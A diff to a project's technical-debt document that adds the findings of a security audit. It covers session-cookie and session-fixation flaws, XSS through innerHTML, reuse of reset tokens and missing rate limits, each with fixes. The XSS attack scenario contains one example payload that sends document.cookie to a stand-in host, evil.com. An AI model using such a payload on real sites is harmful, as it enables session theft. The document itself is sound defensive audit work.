@@ -214,7 +214,8 @@ logger.error('Failed', { error: err.message, stack: err.stack });
 ## Technical Debt Status
 
 **Last Review**: 2026-01-26
-**Current Grade**: A (Solid with P0 security complete, P1 architecture nearly done)
+**Master Engineering Review**: 2026-01-26
+**Current Grade**: B+ (Critical security issues found - DO NOT DEPLOY until P0 complete)
 **Target Grade**: A++ (Production-ready SaaS)
 
 ### Grade Criteria
@@ -222,9 +223,23 @@ logger.error('Failed', { error: err.message, stack: err.stack });
 |-------|-------------|
 | A++ | Production SaaS-ready: comprehensive tests, scalable architecture, zero security concerns |
 | A+ | Enterprise-ready: strong tests, good architecture, minor improvements possible |
-| A | **Current**: Solid - good patterns, all security fixes complete, tests comprehensive |
-| B+ | Good fundamentals, security gaps, inadequate tests, architectural inconsistencies |
+| A | Solid - good patterns, all security fixes complete, tests comprehensive |
+| B+ | **Current**: Good fundamentals, but CRITICAL security gaps discovered in master review |
 | B | Functional: works but has significant debt |
+
+### ⚠️ CRITICAL: Master Engineering Review Findings (2026-01-26)
+
+**DO NOT allow real user accounts until P0-5, P0-6, and P0-7 are fixed.**
+
+The following critical vulnerabilities were discovered during comprehensive code audit:
+
+| Issue | Severity | Impact | Status |
+|-------|----------|--------|--------|
+| P0-5: Cookie name mismatch | 🔴 CRITICAL | Sessions persist after logout | OPEN |
+| P0-6: No session regeneration | 🔴 CRITICAL | Session fixation attacks possible | OPEN |
+| P0-7: XSS in 13 HTML files | 🔴 CRITICAL | Script injection via error messages | OPEN |
+| P1-6: 7 routes missing validators | 🟡 HIGH | Input validation bypass | OPEN |
+| P1-7: Password reset token reuse | 🟡 HIGH | Token brute-force possible | OPEN |
 
 ---
 
@@ -234,9 +249,9 @@ logger.error('Failed', { error: err.message, stack: err.stack });
 
 | Priority | Status | Items |
 |----------|--------|-------|
-| P0 Security | 🟡 3.5/4 | P0-1,2,3 complete; P0-4 partial (event handlers done, inline scripts pending) |
-| P1 Architecture | 🟡 4/5 | P1-1 in progress, P1-2 catalog routes wired (78% reduction), P1-3 complete, P1-4, P1-5 done |
-| P2 Testing | ✅ 6/6 | All complete (P2-2, P2-5 finished 2026-01-26) |
+| P0 Security | 🔴 4/7 | P0-1,2,3 complete; P0-4 partial; **P0-5,6,7 NEW CRITICAL** |
+| P1 Architecture | 🟡 5/9 | P1-1 in progress; P1-2,3,4,5 complete; **P1-6,7,8,9 NEW** |
+| P2 Testing | 🟡 5.5/6 | Tests exist but P2-4 has implementation gap (see P0-6) |
 | P3 Scalability | 🟡 Optional | Multi-instance deployment prep |
 
 ---
@@ -320,6 +335,133 @@ Fixed 3 locations exposing internal error details to clients:
 <select data-change="filterLogs">
 ```
 Global functions are automatically discovered by the event delegation module.
+
+---
+
+### P0-5: Session Cookie Name Mismatch 🔴 CRITICAL NEW
+**Files**: `server.js:172`, `routes/auth.js:191`
+**Status**: OPEN - FIX IMMEDIATELY
+**Discovered**: Master Engineering Review 2026-01-26
+
+**Problem**: Session cookie is configured with name `'sid'` but logout clears `'connect.sid'`:
+```javascript
+// server.js:172
+name: 'sid',  // Cookie name is 'sid'
+
+// routes/auth.js:191
+res.clearCookie('connect.sid');  // WRONG! Should be 'sid'
+```
+
+**Impact**:
+- User sessions persist after logout
+- Attacker who obtains session cookie can use it indefinitely
+- Session hijacking remains effective even after victim "logs out"
+
+**Fix**:
+```javascript
+// routes/auth.js:191 - Change to:
+res.clearCookie('sid');
+```
+
+---
+
+### P0-6: Missing Session Regeneration on Login 🔴 CRITICAL NEW
+**File**: `routes/auth.js:137-143`
+**Status**: OPEN - FIX IMMEDIATELY
+**Discovered**: Master Engineering Review 2026-01-26
+
+**Problem**: Login handler does NOT call `req.session.regenerate()` before setting user data.
+
+**Current Code** (VULNERABLE):
+```javascript
+// routes/auth.js:137-143 - After password verification
+req.session.user = {
+    id: user.id,
+    email: user.email,
+    name: user.name,
+    role: user.role
+};
+```
+
+**Attack Scenario (Session Fixation)**:
+1. Attacker visits site, gets session ID `abc123`
+2. Attacker tricks victim into using session ID `abc123` (via URL, cookie injection, etc.)
+3. Victim logs in successfully
+4. Session `abc123` now has victim's credentials
+5. Attacker uses `abc123` to access victim's account
+
+**Impact**: Complete account takeover without knowing victim's password
+
+**Fix**:
+```javascript
+// routes/auth.js - After password verification, BEFORE setting user:
+req.session.regenerate((err) => {
+    if (err) {
+        logger.error('Session regeneration failed', { error: err.message });
+        return res.status(500).json({ error: 'Login failed' });
+    }
+
+    req.session.user = {
+        id: user.id,
+        email: user.email,
+        name: user.name,
+        role: user.role
+    };
+
+    // ... rest of login response
+});
+```
+
+**Note**: Test at `__tests__/routes/auth.test.js:557` documents this requirement but tests a mock, not the actual implementation. The test passes but the code is vulnerable.
+
+---
+
+### P0-7: XSS via Unescaped innerHTML 🔴 CRITICAL NEW
+**Files**: 13 HTML files with 25 vulnerable locations
+**Status**: OPEN - FIX BEFORE PRODUCTION
+**Discovered**: Master Engineering Review 2026-01-26
+
+**Problem**: Template literals injected into innerHTML without escaping:
+```javascript
+// VULNERABLE - error.message could contain <script> tags
+element.innerHTML = `Error: ${error.message}`;
+element.innerHTML = `<div class="alert">${message}</div>`;
+```
+
+**Vulnerable Files**:
+| File | Line(s) | Context |
+|------|---------|---------|
+| `public/login.html` | 350 | Server response message |
+| `public/dashboard.html` | 965, 1162 | Error message, sync result |
+| `public/delivery.html` | 1014 | Alert message |
+| `public/settings.html` | 1077 | Error message |
+| `public/vendor-catalog.html` | 1420, 1525, 1595 | Error messages |
+| `public/reorder.html` | 799 | Error message |
+| `public/gmc-feed.html` | 1310 | Error loading feed |
+| `public/deleted-items.html` | 343 | Error message |
+| `public/expiry.html` | 403 | Error message |
+| `public/cycle-count-history.html` | 295 | Error message |
+| `public/expiry-discounts.html` | 690 | Status data |
+| `public/loyalty.html` | Multiple | Various error messages |
+
+**Attack Scenario**:
+1. Attacker crafts input that causes server error with payload: `<img src=x onerror="document.location='https://evil.com/steal?c='+document.cookie">`
+2. Server returns error message containing the payload
+3. Victim sees page with `innerHTML = error.message`
+4. Script executes, stealing session cookie
+
+**Impact**: Session hijacking, data theft, phishing via injected content
+
+**Fix Pattern** (escapeHtml function exists in most files):
+```javascript
+// BEFORE (vulnerable):
+element.innerHTML = `Error: ${error.message}`;
+
+// AFTER (safe):
+element.innerHTML = `Error: ${escapeHtml(error.message)}`;
+```
+
+**Note**: 257 uses of `escapeHtml()` already exist - the pattern is known, just inconsistently applied.
 
 ---
 
@@ -627,6 +769,139 @@ Updated `routes/auth.js` to use the new validators middleware.
 
 ---
 
+### P1-6: Missing Input Validators 🟡 HIGH NEW
+**Files**: `routes/square-attributes.js`, `routes/cycle-counts.js`
+**Status**: OPEN
+**Discovered**: Master Engineering Review 2026-01-26
+
+**Problem**: 7 routes accept POST/PUT requests without validation middleware:
+
+| File | Line | Endpoint | Risk |
+|------|------|----------|------|
+| `square-attributes.js` | 49 | POST `/square/custom-attributes/init` | Low - no body params |
+| `square-attributes.js` | 106 | POST `/square/custom-attributes/push/case-pack` | Low - no body params |
+| `square-attributes.js` | 117 | POST `/square/custom-attributes/push/brand` | Low - no body params |
+| `square-attributes.js` | 128 | POST `/square/custom-attributes/push/expiry` | Low - no body params |
+| `square-attributes.js` | 139 | POST `/square/custom-attributes/push/all` | Low - no body params |
+| `cycle-counts.js` | 401 | POST `/cycle-counts/email-report` | Low - no body params |
+| `cycle-counts.js` | 416 | POST `/cycle-counts/generate-batch` | Low - no body params |
+
+**Note**: These routes don't accept body parameters, so risk is low. However, validators should be added for consistency and to validate query params if any are added later.
+
+**Fix**: Add validators even for parameterless routes (documents API contract):
+```javascript
+// middleware/validators/square-attributes.js
+const init = []; // No params to validate, but documents intentional empty validation
+
+// routes/square-attributes.js
+router.post('/square/custom-attributes/init', requireAuth, requireMerchant, validators.init, asyncHandler(...));
+```
+
+---
+
+### P1-7: Password Reset Token Not Invalidated on Failed Attempts 🟡 HIGH NEW
+**File**: `routes/auth.js:639-699`
+**Status**: OPEN
+**Discovered**: Master Engineering Review 2026-01-26
+
+**Problem**: Password reset token is only marked as `used` after successful password change (line 681). If an attacker guesses wrong passwords, the token remains valid indefinitely.
+
+**Attack Scenario**:
+1. Victim initiates password reset, receives token `xyz`
+2. Attacker intercepts token (email compromise, shoulder surfing, etc.)
+3. Attacker tries common passwords with token `xyz`
+4. Token remains valid after each failed attempt
+5. Attacker has unlimited attempts over 1-hour window
+
+**Impact**: Combined with weak password policies, enables account takeover
+
+**Fix Options**:
+
+Option A - Limit attempts per token:
+```javascript
+// Add column: password_reset_tokens.attempts_remaining DEFAULT 5
+// On each failed attempt: decrement and check
+if (token.attempts_remaining <= 0) {
+    return res.status(400).json({ error: 'Reset link expired' });
+}
+await db.query('UPDATE password_reset_tokens SET attempts_remaining = attempts_remaining - 1 WHERE id = $1', [token.id]);
+```
+
+Option B - Rate limit endpoint per token:
+```javascript
+const resetRateLimit = rateLimit({
+    windowMs: 15 * 60 * 1000,
+    max: 5,
+    keyGenerator: (req) => req.body.token
+});
+```
+
+---
+
+### P1-8: Webhook Endpoint Not Rate Limited 🟡 MEDIUM NEW
+**File**: `server.js:260`
+**Status**: OPEN
+**Discovered**: Master Engineering Review 2026-01-26
+
+**Problem**: `/api/webhooks/square` endpoint has no rate limiting. While HMAC signature verification provides authentication, an attacker could:
+1. Replay valid signed requests rapidly
+2. DDoS the webhook processing pipeline
+3. Exhaust database connections with rapid webhook processing
+
+**Current Protection**: HMAC signature verification + idempotency table
+**Missing**: Request rate limiting
+
+**Fix**:
+```javascript
+// middleware/security.js - Add webhook rate limiter
+const webhookRateLimit = rateLimit({
+    windowMs: 60 * 1000, // 1 minute
+    max: 100, // 100 webhooks per minute per merchant
+    keyGenerator: (req) => {
+        // Key by Square merchant ID from payload
+        return req.body?.merchant_id || req.ip;
+    },
+    message: { error: 'Too many webhook requests' }
+});
+
+// server.js - Apply to webhook route
+app.use('/api/webhooks/square', webhookRateLimit);
+```
+
+---
+
+### P1-9: Error Messages Still Expose Internal Details 🟡 MEDIUM NEW
+**File**: `routes/subscriptions.js`
+**Status**: OPEN
+**Discovered**: Master Engineering Review 2026-01-26
+
+**Problem**: While P0-3 fixed 3 locations, additional error exposure found:
+
+| Line | Issue |
+|------|-------|
+| 237 | Returns Square customer creation error detail |
+| 257 | Returns Square card creation error detail |
+| 335 | `'Payment failed: ' + (paymentError.message)` |
+| 381 | `'Subscription failed: ' + (subError.message)` |
+
+**Impact**: Exposes Square API internals, aids attacker reconnaissance
+
+**Fix Pattern**:
+```javascript
+// BEFORE:
+return res.status(400).json({ error: errorMsg });
+
+// AFTER:
+logger.warn('Customer creation failed', { error: errorMsg, email });
+return res.status(400).json({
+    success: false,
+    error: 'Account creation failed. Please try again.',
+    code: 'CUSTOMER_CREATION_FAILED'
+});
+```
+
+---
+
 ## P2: Testing Requirements (HIGH)
 
 ### P2-1: Multi-Tenant Isolation Tests ✅ COMPLETE
@@ -686,27 +961,35 @@ Updated `routes/auth.js` to use the new validators middleware.
 
 ---
 
-### P2-4: Authentication Edge Case Tests ✅ COMPLETE
+### P2-4: Authentication Edge Case Tests 🟡 PARTIAL
 **Files**:
 - `__tests__/middleware/auth.test.js` (584 lines)
 - `__tests__/routes/auth.test.js` (47 tests)
-**Status**: COMPLETE (2026-01-26)
+**Status**: TESTS EXIST but don't verify actual implementation
 
-**All required tests exist**:
+**⚠️ TEST GAP DISCOVERED (Master Engineering Review 2026-01-26)**:
+- Test at `auth.test.js:557` ("regenerates session ID on login") uses a **mock** session object
+- The test passes because it tests `mockSession.regenerate()` being called
+- **BUT** the actual `routes/auth.js` login handler does NOT call `req.session.regenerate()`
+- This is a false-positive test - documents the requirement but doesn't verify implementation
+
+**Tests that exist**:
 - ✅ requireAuth, requireAuthApi, requireAdmin, requireRole
 - ✅ requireWriteAccess, optionalAuth, getCurrentUser
 - ✅ getClientIp (x-forwarded-for, x-real-ip, etc.)
 - ✅ Session with null/undefined user
 - ✅ Missing role property
 - ✅ Case-sensitive role matching
-- ✅ Session expiry handling (auth.test.js)
-- ✅ Session fixation attack prevention (auth.test.js)
-- ✅ Session ID regeneration on login (auth.test.js)
-- ✅ Secure session cookie configuration (auth.test.js)
-- ✅ Session does not contain sensitive data (auth.test.js)
-- ✅ Complete session destruction on logout (auth.test.js)
-- ✅ Account lockout after failed attempts (auth.test.js)
-- ✅ User enumeration prevention (auth.test.js)
+- ✅ Session expiry handling
+- ⚠️ Session fixation attack prevention (test mocks, doesn't verify real code - **SEE P0-6**)
+- ⚠️ Session ID regeneration on login (test mocks, doesn't verify real code - **SEE P0-6**)
+- ✅ Secure session cookie configuration
+- ✅ Session does not contain sensitive data
+- ⚠️ Complete session destruction on logout (cookie name wrong - **SEE P0-5**)
+- ✅ Account lockout after failed attempts
+- ✅ User enumeration prevention
+
+**Action Required**: After fixing P0-5 and P0-6, add integration tests that verify actual behavior.
 
 Note: Login rate limiting tested in `security.test.js`
 
@@ -847,7 +1130,61 @@ Before merging any PR:
 
 | Grade | P0 | P1 | P2 | P3 |
 |-------|----|----|----|----|
-| A++ | 4/4 ✅ | 5/5 ✅ | 6/6 ✅ | Optional |
-| A+ | 4/4 ✅ | 5/5 ✅ | 4/6 ✅ | - |
-| A (Current) | 4/4 ✅ | 4/5 🟡 | 6/6 ✅ | - |
-| B+ | 3/4 🟡 | 3/5 🟡 | 6/6 ✅ | - |
+| A++ | 7/7 ✅ | 9/9 ✅ | 6/6 ✅ | Optional |
+| A+ | 7/7 ✅ | 7/9 ✅ | 5/6 ✅ | - |
+| A | 7/7 ✅ | 5/9 🟡 | 5/6 ✅ | - |
+| B+ (Current) | 4/7 🔴 | 5/9 🟡 | 5.5/6 🟡 | - |
+
+---
+
+## Executive Summary for Non-Technical Stakeholders
+
+### What This Means (Plain English)
+
+**Current State**: The application has **3 critical security vulnerabilities** that must be fixed before real users can safely use it.
+
+**The Good News**:
+- Database security is excellent (no SQL injection, proper encryption)
+- Multi-tenant isolation works (users can't see other merchants' data)
+- Password hashing is industry-standard (bcrypt, 12 rounds)
+- API tokens are properly encrypted (AES-256-GCM)
+- 23 test files with good coverage of business logic
+
+**The Bad News (Must Fix)**:
+
+1. **Logout Doesn't Work Properly** (P0-5)
+   - *What*: When users click "Logout", the session cookie isn't actually cleared
+   - *Risk*: If someone steals a logged-in user's cookie, they stay logged in forever even after the user "logs out"
+   - *Fix*: 1 line of code change
+
+2. **Login Can Be Hijacked** (P0-6)
+   - *What*: The session ID doesn't change when someone logs in
+   - *Risk*: An attacker can pre-set a session ID, trick someone into logging in, then use that same session ID to become them
+   - *Fix*: ~10 lines of code change
+
+3. **Error Messages Can Run Malicious Code** (P0-7)
+   - *What*: Error messages are displayed without sanitization in 13 pages
+   - *Risk*: An attacker could inject JavaScript that steals login cookies when error messages appear
+   - *Fix*: ~25 places need `escapeHtml()` wrapper added
+
+### Priority Order
+
+| Priority | Items | Time Estimate | Blocked? |
+|----------|-------|---------------|----------|
+| **Fix First** | P0-5 (1 line), P0-6 (~10 lines) | 1-2 hours | Blocks production |
+| **Fix Second** | P0-7 (25 locations) | 2-3 hours | Blocks production |
+| **Fix Third** | P1-7, P1-9 (error messages) | 2-3 hours | Should fix before production |
+| **Then** | P1-6, P1-8 (validators, rate limits) | 1-2 hours | Nice to have |
+
+### What "Production Ready" Means
+
+Before allowing real merchants with real customer data:
+- [x] SQL injection protection (done)
+- [x] Password encryption (done)
+- [x] Token encryption (done)
+- [x] Multi-tenant isolation (done)
+- [ ] Session security (P0-5, P0-6)
+- [ ] XSS protection (P0-7)
+- [ ] Complete error message sanitization (P1-9)
+
+**Estimated time to production-ready: 6-10 hours of focused work**
